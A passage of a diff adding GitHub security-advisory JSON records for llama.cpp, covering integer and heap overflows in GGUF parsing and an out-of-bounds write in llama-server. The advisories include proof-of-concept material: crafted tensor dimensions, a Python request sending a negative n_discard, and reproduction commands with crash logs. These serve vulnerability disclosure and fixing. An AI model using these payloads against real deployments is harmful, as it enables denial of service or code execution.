+          "gists_url": "https://api.github.com/users/las7/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/las7/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/las7/subscriptions",
+          "organizations_url": "https://api.github.com/users/las7/orgs",
+          "repos_url": "https://api.github.com/users/las7/repos",
+          "events_url": "https://api.github.com/users/las7/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/las7/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 12,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-96jg-mvhq-q7q7",
+    "cve_id": "CVE-2026-33298",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-96jg-mvhq-q7q7",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-96jg-mvhq-q7q7",
+    "summary": "Heap Buffer Overflow via Integer Overflow in GGUF Tensor Parsing",
+    "description": "### Summary\r\nAn integer overflow vulnerability in the `ggml_nbytes` function allows an attacker to bypass memory validation by crafting a GGUF file with specific tensor dimensions. This causes `ggml_nbytes` to return a significantly smaller size than required (e.g., 4MB instead of Exabytes), leading to a heap-based buffer overflow when the application subsequently processes the tensor. This vulnerability allows potential Remote Code Execution (RCE) via memory corruption.\r\n\r\n### Details\r\nThe vulnerability exists in `ggml/src/ggml.c` within the `ggml_nbytes` function, which calculates the storage size of a tensor:\r\n\r\n```c\r\n// ggml/src/ggml.c\r\nsize_t ggml_nbytes(const struct ggml_tensor * tensor) {\r\n    // ...\r\n    size_t nbytes;\r\n    const size_t blck_size = ggml_blck_size(tensor->type);\r\n    if (blck_size == 1) {\r\n        nbytes = ggml_type_size(tensor->type);\r\n        for (int i = 0; i < GGML_MAX_DIMS; ++i) {\r\n            nbytes += (tensor->ne[i] - 1)*tensor->nb[i]; // <--- VULNERABILITY\r\n        }\r\n    }\r\n    // ...\r\n    return nbytes;\r\n}\r\n```\r\n\r\nThe multiplication `(tensor->ne[i] - 1) * tensor->nb[i]` operates on `int64_t` (converted to `size_t`), which is vulnerable to integer overflow.\r\nAdditionally, the GGUF loader in `gguf.cpp` does not adequately validate that the claimed byte size matches the logical dimensions, nor does it check if the total logical size exceeds `SIZE_MAX` bytes, only checking if the *element count* fits in `INT64_MAX`.\r\n\r\n### PoC\r\nTo reproduce this vulnerability, create a GGUF file containing a tensor with the following properties:\r\n*   **Type**: `GGML_TYPE_F32` (4 bytes)\r\n*   **Dimensions**: `ne = [1024, 1024, 4398046511105, 1]`\r\n    *   Note: `4398046511105` is `2^42 + 1`.\r\n\r\n**Calculation Breakdown:**\r\n1.  Strides (`nb`) are calculated naturally:\r\n    *   `nb[0] = 4`\r\n    *   `nb[1] = 4 * 1024 = 4096`\r\n    *   `nb[2] = 4096 * 1024 = 4,194,304 (2^22)`\r\n2.  `ggml_nbytes` Loop:\r\n    *   `i=2` term: `(ne[2] - 1) * nb[2]`\r\n    *   `= (2^42) * (2^22) = 2^64`\r\n    *   `= 0` (due to overflow wrapping on 64-bit systems).\r\n3.  Result: The calculated size (`nbytes`) represents only the small dimensions (0 and 1), resulting in ~4MB allocation.\r\n4.  Real Size: The tensor logically contains `~2^62` elements, requiring Exabytes of memory.\r\n5.  Crash: Accessing this tensor triggers a heap buffer overflow.\r\n\r\n<img width=\"1344\" height=\"694\" alt=\"poc\" src=\"https://github.com/user-attachments/assets/02c80ccd-0185-4a57-b67c-2bddac3fd982\" />\r\n\r\n### Impact\r\n*   **Vulnerability Type**: Heap-based Buffer Overflow\r\n*   **Impact**: Remote Code Execution (RCE), Denial of Service (DoS).\r\n*   **Affected Components**: Applications using `llama.cpp` to load untrusted GGUF models.\r\n*   **Attack Vector**: An attacker provides a malicious GGUF file which, when loaded, triggers the overflow.\r\n### Suggested Fix\r\n1.  **Checked Arithmetic**: Use checked arithmetic functions (e.g., `__builtin_mul_overflow`) in `ggml_nbytes` and stride calculations to detect overflows.\r\n2.  **Input Validation**: Implement strict size validation in `gguf.cpp` when parsing tensor information. Verify that the total size in bytes (not just element count) fits within addressable memory limits (e.g., `SIZE_MAX`) before accepting the tensor.\r\n\r\n```c\r\n// Example validation logic\r\nif (total_elements > SIZE_MAX / ggml_type_size(type)) {\r\n    return false; // Overflow would occur\r\n}\r\n```",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-96jg-mvhq-q7q7",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-33298",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-18T21:48:49Z",
+    "published_at": "2026-03-18T18:37:01Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "ggml-org/llama.cpp"
+        },
+        "vulnerable_version_range": "< b7437",
+        "patched_versions": "b7824",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-122",
+        "name": "Heap-based Buffer Overflow"
+      },
+      {
+        "cwe_id": "CWE-190",
+        "name": "Integer Overflow or Wraparound"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-122",
+      "CWE-190"
+    ],
+    "credits": [
+      {
+        "login": "alexanderkent",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "alexanderkent",
+          "id": 842981,
+          "node_id": "MDQ6VXNlcjg0Mjk4MQ==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/842981?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/alexanderkent",
+          "html_url": "https://github.com/alexanderkent",
+          "followers_url": "https://api.github.com/users/alexanderkent/followers",
+          "following_url": "https://api.github.com/users/alexanderkent/following{/other_user}",
+          "gists_url": "https://api.github.com/users/alexanderkent/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/alexanderkent/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/alexanderkent/subscriptions",
+          "organizations_url": "https://api.github.com/users/alexanderkent/orgs",
+          "repos_url": "https://api.github.com/users/alexanderkent/repos",
+          "events_url": "https://api.github.com/users/alexanderkent/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/alexanderkent/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 12,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "score": 7.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-8947-pfff-2f3c",
+    "cve_id": "CVE-2026-21869",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-8947-pfff-2f3c",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-8947-pfff-2f3c",
+    "summary": "Out-of-bounds Write in llama.cpp llama-server",
+    "description": "### Summary\r\n\r\nContext shift trusts the client\u2019s n_discard blindly. A remote attacker can supply a negative value through the public completions\r\nendpoints, corrupt the KV cache/text buffers during shifting, and crash the process or pivot to RCE. Severity: Critical.\r\n\r\n### Details\r\n\r\n- Entry points: /completions, /chat/completions, /slots/(resume)\u2014anything that goes through server_task::params_from_json_cmpl().\r\n- tools/server/server.cpp:326: n_discard is parsed straight from JSON into slot_params::n_discard with no non\u2011negative check.\r\n- When the context is full, server_context::update_slots() consumes slot.task->params.n_discard to shift tokens (tools/server/\r\n  server.cpp:3613 ff.).\r\n- A negative value causes:\r\n    - llama_memory_seq_rm/add to receive a reversed range and negative offset, desynchronizing the KV cache.\r\n    - The loop at tools/server/server.cpp:3626-3630 to evaluate new_tokens[i - n_discard] as new_tokens[i + |n_discard|], writing\r\n      beyond the end of the std::vector.\r\n- With ASan or the built-in guards you see aborts (pos_min == -1), but removing them yields deterministic out-of-bounds writes\u2014\r\n  exactly what an attacker needs for code execution.\r\n\r\n### PoC\r\n\r\nPrerequisite: start the server with context shift enabled (--context-shift). Works for both CPU and GPU builds; below uses a\r\nCUDA+ASan binary.\r\n\r\n1. Build llama-server with CUDA and ASan (per the standard instructions).\r\n2. Launch it:\r\n\r\nCUDA_LAUNCH_BLOCKING=1 \\\r\nASAN_OPTIONS=abort_on_error=1:detect_leaks=0 \\\r\nLSAN_OPTIONS=detect_leaks=0 \\\r\nLD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH \\\r\nbuild-cuda-asan/bin/llama-server \\\r\n  --model /models/DeepSeek-R1-Distill-Qwen-32B-Q2_K.gguf \\\r\n  --ctx-size 128 \\\r\n  --port 8080 \\\r\n  --context-shift\r\n\r\n3. Issue a malicious request (no auth needed):\r\n```python\r\n#!/usr/bin/env python3\r\nimport requests\r\n\r\nresp = requests.post(\r\n    \"http://127.0.0.1:8080/completions\",\r\n    json={\r\n        \"prompt\": \"seed text\",\r\n        \"stream\": False,\r\n        \"cache_prompt\": True,\r\n        \"n_predict\": 512,\r\n        \"n_keep\": 0,\r\n        \"n_discard\": -32,\r\n        \"temperature\": 0.0,\r\n    },\r\n    timeout=60,\r\n)\r\nprint(resp.status_code, resp.text[:200])\r\n```\r\n\r\n4. Server logs show slot context shift ... n_discard = -32, followed by KV inconsistency or ASan OOB reports. In non-sanitized\r\n   builds the same path yields silent memory corruption and opens the door to RCE.\r\n\r\n### Impact\r\n\r\n- Remote unauthenticated out-of-bounds write leading to crash or arbitrary code execution.\r\n- Every llama.cpp deployment running the HTTP server with --context-shift (CPU or GPU) is affected.\r\n- Attacker needs only network access; no credentials or user interaction.\r\n\r\n\r\n### Output\r\n```\r\nThis GDB supports auto-downloading debuginfo from the following URLs:\r\n  <https://debuginfod.ubuntu.com>\r\nEnable debuginfod for this session? (y or [n]) [answered N; input not from terminal]\r\nDebuginfod has been disabled.\r\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\r\nwarning: could not find '.gnu_debugaltlink' file for /lib/x86_64-linux-gnu/liblber.so.2\r\nwarning: could not find '.gnu_debugaltlink' file for /lib/x86_64-linux-gnu/libbrotlidec.so.1\r\nwarning: could not find '.gnu_debugaltlink' file for /lib/x86_64-linux-gnu/libbrotlicommon.so.1\r\n[Thread debugging using libthread_db enabled]\r\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\r\n0x00007f0c1219d813 in wait4 () from /lib/x86_64-linux-gnu/libc.so.6\r\n#0  0x00007f0c1219d813 in wait4 () from /lib/x86_64-linux-gnu/libc.so.6\r\n#1  0x0000556d78816cd6 in __interceptor_waitpid ()\r\n#2  0x00007f0c12670177 in ggml_print_backtrace () at /workspace/ggml/src/ggml.c:196\r\n196             waitpid(child_pid, NULL, 0);\r\n#3  0x00007f0c1267067a in ggml_abort (file=<optimized out>, line=<optimized out>, fmt=<optimized out>) at /workspace/ggml/src/ggml.c:230\r\n230             ggml_print_backtrace();\r\n#4  0x0000556d78a71d73 in server_context::update_slots (this=0x7f0c0fa01900) at /workspace/tools/server/server.cpp:3835\r\n3835                                        GGML_ABORT(\"pos_min == -1, but n_past > 0 - should not happen: https://github.com/ggml-org/llama.cpp/pull/13833#discussion_r2116181237\");\r\n#5  0x0000556d7891c8ca in std::function<void ()>::operator()() const (this=0x7f0c0fa03078) at /usr/bin/../lib/gcc/x86_64-linux-gnu/13/../../../../include/c++/13/bits/std_function.h:591\r\n591             return _M_invoker(_M_functor, std::forward<_ArgTypes>(__args)...);\r\n#6  server_queue::start_loop (this=0x7f0c0fa02f58) at /workspace/tools/server/server.cpp:2152\r\n2152                callback_update_slots();\r\n#7  0x0000556d788c97c4 in main (argc=<optimized out>, argv=<optimized out>) at /workspace/tools/server/server.cpp:5753\r\n5753        ctx_server.queue_tasks.start_loop();\r\n[Inferior 1 (process 32778) detached]\r\n[1]    32778 IOT instruction (core dumped)  ASAN_OPTIONS=abort_on_error=1:detect_leaks=0 LSAN_OPTIONS=detect_leaks=0  \r\n```\r\n",
+    "severity": "low",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-8947-pfff-2f3c",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-21869",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-04-26T07:06:11Z",
+    "published_at": "2026-01-05T14:00:09Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "ggml-org/llama.cpp",
+          "name": "llama.cpp"
+        },
+        "vulnerable_version_range": "<= 55d4206c8",
+        "patched_versions": ">= c78fb90",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-787",
+        "name": "Out-of-bounds Write"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-787"
+    ],
+    "credits": [
+      {
+        "login": "tylzh97",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "tylzh97",
+          "id": 24435007,
+          "node_id": "MDQ6VXNlcjI0NDM1MDA3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/24435007?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/tylzh97",
+          "html_url": "https://github.com/tylzh97",
+          "followers_url": "https://api.github.com/users/tylzh97/followers",
+          "following_url": "https://api.github.com/users/tylzh97/following{/other_user}",
+          "gists_url": "https://api.github.com/users/tylzh97/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/tylzh97/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/tylzh97/subscriptions",
+          "organizations_url": "https://api.github.com/users/tylzh97/orgs",
+          "repos_url": "https://api.github.com/users/tylzh97/repos",
+          "events_url": "https://api.github.com/users/tylzh97/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/tylzh97/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 8,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vgg9-87g3-85w8",
+    "cve_id": "CVE-2025-53630",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-vgg9-87g3-85w8",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-vgg9-87g3-85w8",
+    "summary": "Integer Overflow in GGUF Parser can lead to Heap Out-of-Bounds Read/Write in gguf",
+    "description": "### Summary\r\nInteger Overflow in `ggml/src/gguf.cpp`, `gguf_init_from_file_impl` function can lead to Heap Out-of-Bounds Read/Write\r\n\r\n### Details\r\nThe vulnerability originates in the `gguf_init_from_file_impl` function within `ggml/src/gguf.cpp`. This function is responsible for parsing the GGUF model file format, including its metadata and tensor data.\r\n\r\n**Step 1: Cumulative Tensor Size Calculation and Overflow**\r\nThe function iterates through the tensor information read from the GGUF file to calculate the total size required for all tensor data. This total size is accumulated in `ctx->size` (a size_t variable):\r\n```c\r\n// In gguf_init_from_file_impl, after reading tensor metadata into ctx->info:\r\n// ...\r\n    // compute the total size of the data section, taking into account the alignment\r\n    {\r\n        ctx->size = 0;\r\n        for (size_t i = 0; i < ctx->info.size(); ++i) {\r\n            const gguf_tensor_info & ti = ctx->info[i];\r\n            if (ti.offset != ctx->size) { // [Check 1]\r\n                GGML_LOG_ERROR(\"%s: tensor '%s' has offset %\" PRIu64 \", expected %zu\\n\",\r\n                    __func__, ti.t.name, ti.offset, ctx->size);\r\n                GGML_LOG_ERROR(\"%s: failed to read tensor data\\n\", __func__);\r\n                gguf_free(ctx);\r\n                return nullptr;\r\n            }\r\n            ctx->size += GGML_PAD(ggml_nbytes(&ti.t), ctx->alignment); // [Vulnerable Summation]\r\n        }\r\n    }\r\n// ...\r\n```\r\n`ctx->size += GGML_PAD(ggml_nbytes(&ti.t), ctx->alignment);`: This line adds the padded size of the current tensor (ti.t) to `ctx->size`. Crucially, there is no check here to prevent ctx->size from overflowing if the sum exceeds SIZE_MAX. If a GGUF file is crafted with a sequence of tensors whose combined (padded) sizes cause an integer overflow, `ctx->size` will wrap around to a much smaller value than the true required size. Let this small, wrapped-around value be S_final_wrapped.\r\n\r\n**Step 2: Allocation of Insufficient Memory**\r\nAfter calculating ctx->size (which might now be a small, wrapped-around value S_final_wrapped), the code proceeds to allocate memory for the tensor data if params.no_alloc is false.\r\n\r\n```c\r\n// ...\r\n        struct ggml_context * ctx_data = *params.ctx;\r\n        struct ggml_tensor * data = nullptr; // This will be the \"blob\" tensor\r\n\r\n        if (!params.no_alloc) {\r\n            data = ggml_new_tensor_1d(ctx_data, GGML_TYPE_I8, ctx->size); // [Allocation]\r\n            // ...\r\n```\r\n`data = ggml_new_tensor_1d(ctx_data, GGML_TYPE_I8, ctx->size);`: A 1D tensor (referred to as data or blob_tensor in this report) is created. Its data payload is allocated with the size `ctx->size`. If an overflow occurred in Step 1, `ctx->size` is S_final_wrapped, so only a small buffer of S_final_wrapped bytes is allocated on the heap. The pointer to this buffer is `data->data`.\r\n\r\n**Step 3: Miscalculation of Individual Tensor Data Pointers**\r\nThe code then iterates again through `ctx->info` to initialize each ggml_tensor structure within the ctx_data context. The data pointer for each individual tensor (cur->data) is set to point to a location within the (potentially too small) buffer allocated in Step 2.\r\n\r\n```c\r\n// ...\r\n        ggml_set_no_alloc(ctx_data, true); // Temporarily set no_alloc for creating tensor views\r\n\r\n        // create the tensors\r\n        for (size_t i = 0; i < ctx->info.size(); ++i) {\r\n            const struct gguf_tensor_info & info = ctx->info[i]; // `info` is `ti` from Step 1\r\n\r\n            struct ggml_tensor * cur = ggml_new_tensor(ctx_data, info.t.type, GGML_MAX_DIMS, info.t.ne);\r\n            // ...\r\n            ggml_set_name(cur, info.t.name);\r\n\r\n            // point the data member to the appropriate location in the binary blob using the tensor info\r\n            if (!params.no_alloc) {\r\n                cur->data = (char *) data->data + info.offset; // [Vulnerable Assignment]\r\n            }\r\n        }\r\n// ...\r\n```\r\n`cur->data = (char *) data->data + info.offset;`: Here, `data->data` is the base pointer to the allocated heap buffer (of size S_final_wrapped). info.offset is the offset read directly from the GGUF file for this tensor. If the info.offset for a particular tensor is greater than or equal to S_final_wrapped (the actual size of the allocated buffer), then cur->data will point outside the bounds of this allocated heap buffer.\r\n\r\n**Consequence: Out-of-Bounds Access**\r\nAny subsequent operation that uses such a miscalculated `cur->data` pointer (e.g., reading tensor elements for inference, writing to quantize, or even printing values) will result in a heap-based out-of-bounds read or write. For example, the code snippet from examples/gguf/gguf.cpp (specifically from the gguf_ex_read_1 function) attempts to read and print tensor data:\r\n```c\r\n    // ... (inside the loop iterating through tensors)\r\n    struct ggml_tensor * cur = ggml_get_tensor(ctx_data, name); // 'cur' is the tensor struct\r\n\r\n    // ... (printf for tensor metadata, including cur->data which is the OOB pointer)\r\n\r\n    // print first 10 elements\r\n    const float * data_ptr = (const float *) cur->data; // [Leak Point 1] data_ptr now holds the OOB pointer\r\n\r\n    printf(\"%s data[:10] : \", name);\r\n    for (int j = 0; j < MIN(10, ggml_nelements(cur)); ++j) {\r\n        printf(\"%f \", data_ptr[j]); // [Leak Point 2] OOB Read and Print\r\n    }\r\n    printf(\"\\n\\n\");\r\n    // ...\r\n```\r\n`const float * data_ptr = (const float *) cur->data;`: The data_ptr variable is assigned the value of cur->data. If cur->data is an OOB pointer due to the vulnerability, then data_ptr also becomes an OOB pointer.\r\n`printf(\"%f \", data_ptr[j]);`: This line is the core of the information leak. It dereferences the OOB pointer data_ptr to read sizeof(float) bytes from an out-of-bounds heap location.\r\n\r\n\r\n\r\n### PoC\r\nhttps://huggingface.co/yuuoniy/overflow/blob/main/overflow_poc.gguf \r\nA malicious GGUF model file (e.g., poc3.gguf) can be crafted to trigger this vulnerability. The key is to manipulate the tensor metadata (names, dimensions, types, and crucially, offsets) to cause the ctx->size integer overflow and pass relevant checks. please check https://huggingface.co/yuuoniy/overflow/blob/main/generate_poc.c\r\n\r\n\r\n### Reproduce\r\nCommand for Running\r\n```\r\ngcc generate_poc.c -o generate_poc\r\n./generate_poc overflow_poc.gguf \r\n# build the llama.cpp program\r\ncmake -B build -DCMAKE_BUILD_TYPE=Debug  -DGGML_SANITIZE_UNDEFINED=ON -DLLAMA_CURL=OFF\r\ncmake --build build -j\r\n./build/bin/llama-gguf ggml/src/overflow_poc.gguf  r n\r\n```\r\n\r\n```\r\nLog:\r\ngguf_ex_read_0: version:      3\r\ngguf_ex_read_0: alignment:   32\r\ngguf_ex_read_0: data offset: 128\r\ngguf_ex_read_0: n_kv: 0\r\ngguf_ex_read_0: find key: some.parameter.string not found.\r\ngguf_ex_read_0: n_tensors: 2\r\ngguf_ex_read_0: tensor[0]: name = tensor_A, size = 14987979559889010688, offset = 0\r\ngguf_ex_read_0: tensor[1]: name = tensor_B, size = 3458764513820541952, offset = 14987979559889010688\r\n**/home/xx/source/llama.cpp/ggml/src/gguf.cpp:704:49: runtime error: pointer index expression with base 0x562a0c3acdf0 overflowed to 0xd000562a0c3acdf0**\r\ngguf_ex_read_1: version:      3\r\ngguf_ex_read_1: alignment:   32\r\ngguf_ex_read_1: data offset: 128\r\ngguf_ex_read_1: n_kv: 0\r\ngguf_ex_read_1: n_tensors: 2\r\ngguf_ex_read_1: tensor[0]: name = tensor_A, size = 14987979559889010688, offset = 0\r\ngguf_ex_read_1: tensor[1]: name = tensor_B, size = 3458764513820541952, offset = 14987979559889010688\r\ngguf_ex_read_1: reading tensor 0 data\r\ngguf_ex_read_1: tensor[0]: n_dims = 1, ne = (0, 1, 1, 1), name = tensor_A, data = 0x562a0c3acdf0\r\ntensor_A data[:10] : 100.000000 100.000000 100.000000 100.000000 100.000000 100.000000 100.000000 100.000000 100.000000 100.000000 \r\n\r\ngguf_ex_read_1: reading tensor 1 data\r\ngguf_ex_read_1: tensor[1]: n_dims = 1, ne = (512, 1, 1, 1), name = tensor_B, data = 0xd000562a0c3acdf0\r\nSegmentation fault (core dumped)\r\n```\r\nThis can cause to read from invaild address and cause information leak\r\n\r\n### Impact\r\nlead to Heap Out-of-Bounds Read/Write when programs loading malicous gguf model.\r\n\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-vgg9-87g3-85w8",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-53630",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-07-10T15:38:10Z",
+    "published_at": "2025-07-10T05:22:33Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "llama.cpp",
+          "name": ""
+        },
+        "vulnerable_version_range": "<26a48ad",
+        "patched_versions": "26a48ad",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-122",
+        "name": "Heap-based Buffer Overflow"
+      },
+      {
+        "cwe_id": "CWE-680",
+        "name": "Integer Overflow to Buffer Overflow"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-122",
+      "CWE-680"
+    ],
+    "credits": [
+      {
+        "login": "Yuuoniy",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "Yuuoniy",
+          "id": 22578377,
+          "node_id": "MDQ6VXNlcjIyNTc4Mzc3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/22578377?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Yuuoniy",
+          "html_url": "https://github.com/Yuuoniy",
+          "followers_url": "https://api.github.com/users/Yuuoniy/followers",
+          "following_url": "https://api.github.com/users/Yuuoniy/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Yuuoniy/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Yuuoniy/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Yuuoniy/subscriptions",
+          "organizations_url": "https://api.github.com/users/Yuuoniy/orgs",
+          "repos_url": "https://api.github.com/users/Yuuoniy/repos",
+          "events_url": "https://api.github.com/users/Yuuoniy/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Yuuoniy/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 4,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-7rxv-5jhh-j6xx",
+    "cve_id": "CVE-2025-52566",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-7rxv-5jhh-j6xx",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-7rxv-5jhh-j6xx",
+    "summary": "Tokenizer signed vs. unsigned heap overflow",
